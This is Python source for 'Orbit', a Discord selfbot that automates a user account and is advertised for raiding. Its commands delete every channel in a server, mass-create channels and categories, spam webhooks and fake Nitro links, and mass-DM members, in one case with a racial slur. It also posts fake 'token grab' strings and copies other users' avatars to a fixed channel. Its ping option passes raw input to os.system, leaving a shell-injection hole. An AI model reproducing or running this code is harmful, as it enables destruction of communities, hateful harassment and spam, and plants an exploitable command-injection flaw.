ipaddy = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} IP: {RESET}')\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('cls')\n            await Menu(ctx)\n    elif choice == '8':\n        name = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Name: {RESET}')\n        await ctx.message.channel.edit(name=name)\n    elif choice == '>':\n            os.system('cls')\n            await Menu2(ctx)\n    elif choice == '<':\n            os.system('cls')\n            await Menu(ctx)\n\n\n\nasync def Menu2(ctx):\n    ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Page 2')\n    print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                  ╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\n                  ║ [1] insecret            [5] Dog                                       ║\n                  ║ [2] Abc                 [6] Nitro (off sniper)  [<] Previous Page     ║\n                  ║ [3] Uptime              [7] Empty               [>] Next Page         ║\n                  ║ [4] Animate Orbit       [8] Reverse             [X] Exit              ║\n                  ╚═══════════════════════╩═══════════════════════╩═══════════════════════╝ \n________________________________________________________________________________________________________________________                                             ''')\n        \n    choice = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Choice: {RESET}')\n    if choice == 'X':\n            os.system('cls')\n            time.sleep(3)\n            on_ready\n            \n            print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')\n    if choice == '1':\n            zack = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Message: {RESET}')\n            await ctx.send('||'+zack+'||')\n            \n            time.sleep(2)\n            os.system('cls')\n            await Menu2(ctx)\n            \n    elif choice == '2':\n            ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\n            message = await ctx.send(ABC[0])\n            await asyncio.sleep(2)\n            for _next in ABC[1:]:\n             await message.edit(content=_next)\n            await asyncio.sleep(2)\n            os.system('cls')\n            await Menu2(ctx)\n            \n    elif choice == '3':\n            uptime = datetime.datetime.utcnow() - start_time\n            uptime = str(uptime).split('.')[0]\n            await ctx.send(f'> Uptime: `'+uptime+'`')\n            os.system('cls')\n            await Menu2(ctx)\n    elif choice == '4':\n            ABC = [':regional_indicator_o:', ':regional_indicator_r:', ':regional_indicator_b:', ':regional_indicator_i:', ':regional_indicator_t:', ':regional_indicator_o::regional_indicator_r::regional_indicator_b::regional_indicator_i::regional_indicator_t:']\n            message = await ctx.send(ABC[0])\n            await asyncio.sleep(2)\n            for _next in ABC[1:]:\n              await message.edit(content=_next)\n            await asyncio.sleep(1)\n            os.system('cls')\n            await Menu2(ctx)\n    elif choice == '5':\n          r = requests.get(\"https://dog.ceo/api/breeds/image/random\").json()\n          em = discord.Embed()\n          em.set_image(url=str(r['message']))\n          try:\n             await ctx.send(embed=em)\n          except:\n             await ctx.send(str(r['message'])) \n          os.system('cls')\n          await Menu2(ctx)\n    elif choice == '6':\n        await ctx.send(Nitro())\n    elif choice == '7':\n\n        await ctx.send(chr(173))\n        os.system('cls')\n        await Menu2(ctx)\n    elif choice == '8':\n        lmfao = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Message: {RESET}')\n        message = lmfao[::-1]\n        await ctx.send(message)\n        os.system('cls')\n        await Menu2(ctx)\n    elif choice == '>':\n            os.system('cls')\n            await Menu3(ctx)\n    elif choice == '<':\n            os.system('cls')\n            await Menu(ctx)\n            ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Page 1')\n\nasync def Menu3(ctx):\n    ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Page 3')\n    print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                  ╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\n                  ║ [1] Shrug               [5] Bold                                      ║\n                  ║ [2] Lenny               [6] Massreact2          [<] Previous Page     ║\n                  ║ [3] Tableflip           [7] Empty               [>] Next Page         ║\n                  ║ [4] Unflip              [8] Reverse             [X] Exit              ║\n                  ╚═══════════════════════╩═══════════════════════╩═══════════════════════╝ \n________________________________________________________________________________________________________________________                                             ''')\n        \n    choice = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Choice: {RESET}')\n    if choice == 'X':\n            os.system('cls')\n            time.sleep(3)\n            on_ready\n            \n            print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: {RESET}{config.get('prefix')}{RESET} \n________________________________________________________________________________________________________________________                                             ''')\n    if choice == '1':\n            shrug = r'¯\\_(ツ)_/¯'\n            await ctx.send(shrug)\n            os.system('cls')\n            await Menu3(ctx)\n            \n    elif choice == '2':\n            lenny = '( ͡° ͜ʖ ͡°)'\n            await ctx.send(lenny)\n            os.system('cls')\n            await Menu3(ctx)\n            \n    elif choice == '3':\n            tableflip = '(╯°□°）╯︵ ┻━┻'\n            await ctx.send(tableflip)\n            os.system('cls')\n            await Menu3(ctx)\n    elif choice == '4':\n            unflip = '┬─┬ ノ( ゜-゜ノ)'\n            await ctx.send(unflip)\n            os.system('cls')\n            await Menu3(ctx)\n    elif choice == '5':\n     message = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Message: {RESET}')\n     await ctx.send('**'+message+'**')\n     os.system('cls')\n     await Menu3(ctx)\n    elif choice == '6':\n        await ctx.message.delete()\n        messages = await ctx.message.channel.history(limit=7).flatten()\n        for message in messages:\n         await message.add_reaction(\"❎\")\n         await message.add_reaction(\"🥵\")\n         await message.add_reaction(\"🙏\")\n         await message.add_reaction(\"🎓\")\n         await message.add_reaction(\"👋🏼\")\n         await message.add_reaction(\"👨🏼‍💻\")\n         await message.add_reaction(\"☄️\")\n         await message.add_reaction(\"🍏\")\n    elif choice == '7':\n\n        await ctx.send(chr(173))\n        os.system('cls')\n        await Menu2(ctx)\n    elif choice == '8':\n        lmfao = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Message: {RESET}')\n        message = lmfao[::-1]\n        await ctx.send(message)\n        os.system('cls')\n        await Menu2(ctx)\n    elif choice == '>':\n            os.system('cls')\n            await Menu3(ctx)\n    elif choice == '<':\n            os.system('cls')\n            await Menu2(ctx)\n\ndef WebHook():\n url = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Webhook Url: {RESET}')\n message = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Message: {RESET}')\n threading.Thread(target=WebHook).start()\n webhook = Webhook.from_url(f\"{url}\", adapter=RequestsWebhookAdapter())\n webhook.send(f\"{message}\")\n\n\n\n\n@client.command()\nasync def uiversion(ctx):\n    await ctx.message.delete()\n    ctypes.windll.kernel32.SetConsoleTitleW(f'Orbit | Page 1')\n    os.system('cls')\n    print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                  ╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\n                  ║ [1] Delete Channels     [5] Webhook                                   ║\n                  ║ [2] Create Channels     [6] Create Categorys                          ║\n                  ║ [3] Server name         [7] Pinger              [>] Next Page         ║\n                  ║ [4] Rename Channels     [8] GC Name             [X] Exit              ║\n                  ╚═══════════════════════╩═══════════════════════╩═══════════════════════╝ \n________________________________________________________________________________________________________________________                                             ''')\n        \n    choice = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Choice: {RESET}')\n    if choice == '1':\n            for channel in list(ctx.guild.channels):\n             try:\n                await channel.delete()\n             except:\n                pass\n            \n            time.sleep(2)\n            os.system('cls')\n            await Menu(ctx)\n            \n    elif choice == '2':\n            nameee = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Channel Names: {RESET}')\n            for _i in range(20):\n             await ctx.guild.create_text_channel(name=f\"{nameee}\")\n            os.system('cls')\n            await Menu(ctx)\n            \n    elif choice == '3':\n            Servernamee = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Server Name: {RESET}')\n            await ctx.guild.edit(\n            name=f\"{Servernamee}\",\n            \n            )\n            os.system('cls')\n            await Menu(ctx)\n    elif choice == '4':\n            Messageer = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Channel Names: {RESET}')\n            for channel in list(ctx.guild.channels):\n             try:\n                 await channel.edit(\n                 name=f\"{Messageer}\",)\n             except:\n                     return\n            os.system('cls')\n            await Menu(ctx)\n    elif choice == '5':\n              WebHook() \n              \n              os.system('cls')\n              await Menu(ctx)\n    elif choice == '6':\n            cAtegorys = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Category Names: {RESET}')\n            for _i in range(20):\n              await ctx.guild.create_category(name=f\"{cAtegorys}\")\n            os.system('cls')\n            await Menu(ctx)\n    elif choice == '7':\n            ipaddy = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} IP: {RESET}')\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('ping {}'.format(ipaddy))\n            os.system('cls')\n            await Menu(ctx)\n    elif choice == '8':\n        name = input(f'{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Name: {RESET}')\n        await ctx.message.channel.edit(name=name)\n    elif choice == '>':\n            os.system('cls')\n            await Menu2(ctx)\n            \n\n    \n\n@client.command()\nasync def orbitad(ctx):\n    await ctx.message.delete()\n    await ctx.send('> **Buy Orbit Today!** \\n> \\n> **Features:** \\n> Key System, Clean Log UI, 3 Different Uis, Nitro Sniper & Nitro Checker/gen, Best Raiding Commands, Top Quality Support, Easy Install/Setup, 100+ Commands + Unique Command \\n> **Website: ** https://sites.google.com/view/orbitselfbot/home')\n\n@client.command()\nasync def dmallf(ctx, *, message):\n    for user in client.user.friends:                \n         await user.send(f\"{message}\")\n\n\n\n@client.command()\nasync def dmallff(ctx):\n    for user in client.guild.members:\n        if user.id == client.user.id:\n            pass\n        else:\n            try:\n                \n                await user.send(\"NIGGER\")\n                await asyncio.sleep(1)\n            except:\n                print(f\"Couldn't interact with {user}\")\n\n\n\n\n\n\n\n\n\n\n@client.command()\nasync def orbit(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```Orbit Commands \\n> .general \\n> .fun \\n> .troll \\n> .account \\n> .raid \\n> .tools \\n> .misc \\n> .botfarmer \\n> .server \\n> .users \\n> .settings``` ')\n\n    \n\n\n\n#general\n\n@client.command()\nasync def general(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```General Commands \\n> .insecret / makes your message a secret  \\n> .abc / types the abc by editing \\n> .av / sends current avatar/pfp \\n> .guildicon / shows the server icon \\n> .animateorbit / shows animation of orbit \\n> .uptime / shows how long the selfbot has been online``` ')\n\n@client.command()\nasync def uptime(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    uptime = datetime.datetime.utcnow() - start_time\n    uptime = str(uptime).split('.')[0]\n    await ctx.send(f'> Uptime: `'+uptime+'`')\n\n@client.command()\nasync def dmallad(ctx):\n    for user in client.user.friends:                \n         await user.send(f\"> **Orbit** \\n> \\n> Features: \\nKey System, Clean Log UI, 3 Different Ui's, Nitro Sniper & Nitro Checker/gen, Best Raiding Commands, Top Quality Support, Easy Install/Setup, 100+ Commands + Unique Commands!\")\n\ndef async_executor():\n    def outer(func):\n        @functools.wraps(func)\n        def inner(*args, **kwargs):\n            thing = functools.partial(func, *args, **kwargs)\n            return loop.run_in_executor(None, thing)\n\n        return inner\n\n    return outer\n\ntts_language = \"en\"\n\n@async_executor()\ndef do_tts(message):\n    f = io.BytesIO()\n    tts = gTTS(text=message.lower(), lang=tts_language)\n    tts.write_to_fp(f)\n    f.seek(0)\n    return f\n\n@client.command()\nasync def dmalls(ctx, *, message): # b'\\xfc'\n    await ctx.message.delete()\n    for user in list(ctx.guild.members):\n        try:\n            await asyncio.sleep(5)    \n            await user.send(message)\n        except:\n            pass\n\n\n\n@client.command()\nasync def tts(ctx, *, message):\n    await ctx.message.delete()\n    buff = await do_tts(message)\n    await ctx.send(file=discord.File(buff, f\"{message}.wav\"))\n\n@client.command(aliases=['guildpfp', 'serverpfp', 'servericon'])\nasync def guildicon(ctx):\n    await ctx.message.delete()\n    await ctx.send(ctx.guild.icon_url)\n\n\n@client.command()\nasync def abc(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']\n    message = await ctx.send(ABC[0])\n    await asyncio.sleep(2)\n    for _next in ABC[1:]:\n        await message.edit(content=_next)\n        await asyncio.sleep(2)\n\n@client.command()\nasync def animateorbit(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    ABC = [':regional_indicator_o:', ':regional_indicator_r:', ':regional_indicator_b:', ':regional_indicator_i:', ':regional_indicator_t:', ':regional_indicator_o::regional_indicator_r::regional_indicator_b::regional_indicator_i::regional_indicator_t:']\n    message = await ctx.send(ABC[0])\n    await asyncio.sleep(2)\n    for _next in ABC[1:]:\n        await message.edit(content=_next)\n        await asyncio.sleep(1)\n\n\n@client.command()\nasync def insecret(ctx, *, message): # b'\\xfc'\n    await ctx.message.delete()\n    await ctx.send('||'+message+'||')\n\n@client.command()\nasync def dontcare(ctx):\n    await ctx.message.delete()\n    await ctx.send(\"https://www.youtube.com/watch?v=Ram7AKbtkGE\")\n\n@client.command(pass_context=True)\nasync def stealnft(ctx, *, user: discord.Member = None):\n    await ctx.message.delete()\n    format = \"gif\"\n    user = user or ctx.author\n    if user.is_avatar_animated() != True:\n        format = \"png\"\n    avatar = user.avatar_url_as(format=format if format != \"gif\" else None)\n    channel = client.get_channel(960670244765069324)\n    async with aiohttp.ClientSession() as session:\n        async with session.get(str(avatar)) as resp:\n            image = await resp.read()\n    with io.BytesIO(image) as file:\n        await channel.send(file=discord.File(file, f\"Avatar.{format}\"))\n\n\n\n\n\n#users\n\n@client.command()\nasync def users(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```Users \\n> .memberid (user) / shows the id``` ')\n\n@client.command()\nasync def memberid(ctx, *, user: discord.Member = None): # b'\\xfc'\n    await ctx.message.delete()\n    if user is None:\n        user = ctx.author      \n    dateformat = \"%a, %d %b %Y %I:%M %p\"\n    perm_string = ', '.join([str(p[0]).replace(\"_\", \" \").title() for p in user.guild_permissions if p[1]])\n    print(Fore.MAGENTA + f\"\\n{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Name: {Fore.RESET}{user}\" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} ID: {Fore.RESET}{user.id}\") \n\n@client.command()\nasync def blur(ctx, user: discord.Member = None):\n    await ctx.message.delete()\n    endpoint = \"https://api.alexflipnote.dev/filter/blur?image=\"\n    if user is None:\n        avatar = str(ctx.author.avatar_url_as(format=\"png\"))\n        endpoint += avatar\n        try:\n            async with aiohttp.ClientSession() as session:\n                async with session.get(endpoint) as resp:\n                    image = await resp.read()\n            with io.BytesIO(image) as file:\n                await ctx.send(file=discord.File(file, f\"orbit_blur.png\"))\n        except:\n            await ctx.send(endpoint)\n    else:\n        avatar = str(user.avatar_url_as(format=\"png\"))\n        endpoint += avatar\n        try:\n            async with aiohttp.ClientSession() as session:\n                async with session.get(endpoint) as resp:\n                    image = await resp.read()\n            with io.BytesIO(image) as file:\n                await ctx.send(file=discord.File(file, f\"orbit_blur.png\"))\n        except:\n            await ctx.send(endpoint)\n\n\n\ncustomcommandname = config.get('animate1')\nanimate2 = config.get('animate2')\nanimate3 = config.get('animate3')\nanimate4 = config.get('animate4')\nanimate5 = config.get('animate5')\nanimate6 = config.get('animate6')\nanimate7 = config.get('animate7')\nanimatefinal = config.get('animatefinal')\n#settings\n\n@client.command()\nasync def settings(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```Settings \\n> .close / closes the selfbot \\n> .prefix (new prefix) \\n> .uiversion / does commands in UI \\n> .customcommands``` ')\n\n\n\n@client.command()\nasync def customcommands(ctx):\n    await ctx.message.delete()\n    await ctx.send(f'> ```Custom Commands \\n> .animate``` ')\n\n@client.command()\nasync def animate(ctx):\n    await ctx.message.delete()\n    ABC = [f'{customcommandname}', f'{animate2}', f'{animate3}', f'{animate4}', f'{animate5}', f'{animatefinal}']\n    message = await ctx.send(ABC[0])\n    await asyncio.sleep(2)\n    for _next in ABC[1:]:\n        await message.edit(content=_next)\n        await asyncio.sleep(0)\n\n@client.command()\nasync def load(ctx):\n    await ctx.message.delete()\n    ABC = [f'----------', '>---------', '>>--------', '>>>-------', '>>>>------', '>>>>>-----', '>>>>>>----', '>>>>>>>---', '>>>>>>>>--', '>>>>>>>>>-', '>>>>>>>>>>', 'DONE!']\n    message = await ctx.send(ABC[0])\n    await asyncio.sleep(2)\n    for _next in ABC[1:]:\n        await message.edit(content=_next)\n        await asyncio.sleep(1)\n\n@client.command()\nasync def prefix(ctx, prefix):\n    await ctx.message.delete()\n    \n    client.command_prefix = str(prefix)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Changed Prefix To:  {Fore.WHITE}{prefix}\" + Fore.RESET)\n\n@client.command()\nasync def close(ctx):\n    await ctx.message.delete()\n    exit()\n\n\n#troll\n\nclient.copycat = None\n\n@client.command()\nasync def troll(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```Troll Commands \\n> .fakenitro / sends a fake nitro link \\n> .massreact (emote) / spams reactions \\n> .token (user) / shows token \\n> .ghostdm / dms somebody then deletes it \\n> .copyy (user) / copys messages from them \\n> .stopcopy / stops copy \\n> .nitrolol / rick roll nitro \\n> .dontcare / sends \"we do not care\" video in chat``` ')\n\n@client.command(aliases=[\"copycatuser\", \"copyuser\"])\nasync def copyy(ctx, user: discord.User):\n    await ctx.message.delete()\n    client.copycat = user\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Now Copying {RESET}\" +  str(client.copycat))\n\n@client.command(aliases=[\"stopcopycatuser\", \"stopcopyuser\", \"stopcopy\"])\nasync def stopcopyy(ctx):\n    await ctx.message.delete()\n    if client.user is None:\n        print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You Werent copying anyone!\")\n        return\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Stopped Copying {RESET}\" +  str(client.copycat))\n    client.copycat = None\n\n\n\n@client.command()\nasync def massreact(ctx, emote):\n    await ctx.message.delete()\n    messages = await ctx.message.channel.history(limit=7).flatten()\n    for message in messages:\n        await message.add_reaction(emote)\n\n@client.command()\nasync def ghostdm(ctx):\n    await ctx.message.delete()\n    async for message in ctx.message.channel.history(limit=1).filter(lambda m: m.author == client.user).map(lambda m: m):\n        try:\n           await message.delete()\n        except:\n            pass\n    \n\n@client.command()\nasync def massreact2(ctx):\n    await ctx.message.delete()\n    messages = await ctx.message.channel.history(limit=7).flatten()\n    for message in messages:\n        await message.add_reaction(\"❎\")\n        await message.add_reaction(\"🥵\")\n        await message.add_reaction(\"🙏\")\n        await message.add_reaction(\"🎓\")\n        await message.add_reaction(\"👋🏼\")\n        await message.add_reaction(\"👨🏼‍💻\")\n        await message.add_reaction(\"☄️\")\n        await message.add_reaction(\"🍏\")\n\n\n\n@client.command()\nasync def fakenitro(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    await ctx.send(Nitro())\n\n#server\n\n@client.command()\nasync def server(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```.createrole (rolename) / creates a role \\n> .createchannel (channelname) / creates a channel \\n> .deletechannel (channel) \\n> .adminservers / shows the servers you are admin in \\n> .createserver / creates a server for you (reminder is does it in your server) ``` ')\n\n@client.command()\nasync def deletechannel(ctx, channel):\n    await channel.delete(name=f\"{channel}\")\n\n@client.command()\nasync def deleteserver(ctx):\n    await client.delete_guild()\n\n@client.command()\nasync def createserver(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Successfully Copyed Server\" + Fore.RESET)\n    for channel in list(ctx.guild.channels):\n        try:\n            await channel.delete()\n            print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {channel.name} was deleted.\" + Fore.RESET)\n            \n        except:\n            return\n    await ctx.guild.create_text_channel(name=\"-----info category----\")\n    await ctx.guild.create_text_channel(name=\"『👋』𝐖𝐞𝐥𝐜𝐨𝐦𝐞\")\n    await ctx.guild.create_text_channel(name=\"『📢』𝐀𝐧𝐧𝐨𝐮𝐧𝐜𝐞𝐦𝐞𝐧𝐭𝐬\")\n    await ctx.guild.create_text_channel(name=\"『📋』𝐑𝐮𝐥𝐞𝐬\")\n    await ctx.guild.create_text_channel(name=\"『✅』𝐕𝐞𝐫𝐢𝐟𝐲\")\n    await ctx.guild.create_text_channel(name=\"『🤖』𝐒𝐞𝐥𝐟-𝐑𝐨𝐥𝐞𝐬\")\n    await ctx.guild.create_text_channel(name=\"-----community category----\")\n    await ctx.guild.create_category(name=f\"🌎 Community\")\n    await ctx.guild.create_text_channel(name=\"『💬』𝐂𝐡𝐚𝐭𝐭𝐢𝐧𝐠\")\n    await ctx.guild.create_text_channel(name=\"『📷』𝐈𝐦𝐚𝐠𝐞𝐬\")\n    await ctx.guild.create_text_channel(name=\"『🏆』𝐒𝐞𝐥𝐟-𝐏𝐫𝐨𝐦𝐨\")\n    await ctx.guild.create_text_channel(name=\"『🤖』𝐁𝐨𝐭-𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬\")\n    await ctx.guild.create_voice_channel(name=\"『📞』𝐕𝐨𝐢𝐜𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝟏\")\n    await ctx.guild.create_voice_channel(name=\"『📞』𝐕𝐨𝐢𝐜𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥 𝟐\")\n    await ctx.guild.create_role(name=f\"Owner\")\n    await ctx.guild.create_role(name=f\"Admin\")\n    await ctx.guild.create_role(name=f\"Member\")\n    await asyncio.sleep(5)\n    \n@client.command()\nasync def tokengrab(ctx, user: discord.Member = None):\n    await ctx.message.delete()\n    list = [\n        \"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\", \"H\", \"I\", \"J\", \"K\", \"L\", \"M\", \"N\",\n        \"O\", \"P\", \"Q\", \"R\", \"S\", \"T\", \"U\", \"V\", \"W\", \"X\", \"Y\", \"Z\", \"_\"\n        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n        'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0',\n        '1', '2', '3', '4', '5', '6', '7', '8', '9'\n    ]\n    token = random.choices(list, k=59)\n    if user is None:\n        user = ctx.author\n        await ctx.send(user.mention + \"'s token is \" + ''.join(token))\n    else:\n        await ctx.send(user.mention + \"'s token is \" + \"\".join(token))\n\n@client.command()\nasync def createrole(ctx, rolename):\n    await ctx.message.delete()\n    await ctx.guild.create_role(name=f\"{rolename}\")\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Created Role {Fore.WHITE}{rolename} \" + Fore.RESET)\n\n@client.command()\nasync def createchannel(ctx, *, channelname):\n    await ctx.message.delete()\n\n    if not ctx.author.permissions_in(ctx.channel).manage_channels:\n         print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You dont have permisson to manage channels!\" + Fore.RESET)\n\n    await ctx.guild.create_text_channel(name=f\"{channelname}\")\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Created Channel {Fore.WHITE}{channelname} \" + Fore.RESET)\n    \n\n#botfarmer\n\n@client.command()\nasync def nitrospam(ctx):\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Nitro Enabled \" + Fore.RESET)\n    await ctx.message.delete()\n    global dmcszz\n    dmcszz = True\n    while dmcszz:\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            print(Nitro())\n            